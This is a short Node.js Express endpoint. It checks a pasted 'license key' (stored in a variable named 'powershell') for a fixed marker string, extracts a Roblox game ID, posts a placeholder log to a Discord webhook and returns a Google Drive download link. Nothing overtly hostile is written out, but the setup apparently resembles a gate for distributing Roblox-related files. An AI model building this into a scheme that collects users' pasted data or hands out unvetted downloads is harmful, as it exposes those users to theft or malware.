app.post("/verify", async (req, res) => {

    console.log("===== NEW REQUEST =====");
    console.log("Body:", req.body);

    const powershell = req.body.licenseKey;
    console.log("LicenseKey:", powershell);

    if (!powershell) {
        console.log("❌ No licenseKey");
        return res.json({ success: false, step: "no_license" });
    }

    const warning = "_|ارتحت كدا اهو لسا بيكراش.|_";
    console.log("Checking warning...");

    if (!powershell.includes(warning)) {
        console.log("❌ Warning not found");
        return res.json({ success: false, step: "warning_failed" });
    }

    console.log("✅ Warning passed");

    const cleanedInput = powershell.replace(/\s+/g, " ").trim();
    const match = cleanedInput.match(/roblox\.com\/(?:[a-z]{2}(?:-[a-z]{2})?\/)?games\/(\d+)/i);

    if (!match) {
        console.log("❌ No Game ID match");
        return res.json({ success: false, step: "no_match" });
    }

    const gameId = match[1];
    console.log("✅ Game ID:", gameId);

    let fileId = fileMap[gameId];

    if (!fileId) {
        console.log("⚠ Game ID not supported — using 000");
        fileId = fileMap["000"];
    }

    const downloadLink =
        "https://drive.google.com/uc?export=download&id=" + fileId;

    console.log("Download link:", downloadLink);
    console.log("Webhook:", WEBHOOK_URL);

    try {
        if (WEBHOOK_URL) {

            const form = new FormData();
            form.append("file", Buffer.from("test log"), {
                filename: "log.txt",
                contentType: "text/plain"
            });

            const response = await fetch(WEBHOOK_URL, {
                method: "POST",
                body: form
            });

            console.log("Discord response status:", response.status);

        } else {
            console.log("❌ DISCORD_WEBHOOK not set");
        }

    } catch (err) {
        console.log("❌ Discord error:", err.message);
    }

    console.log("===== END REQUEST =====");

    return res.json({
        success: true,
        download: downloadLink
    });

});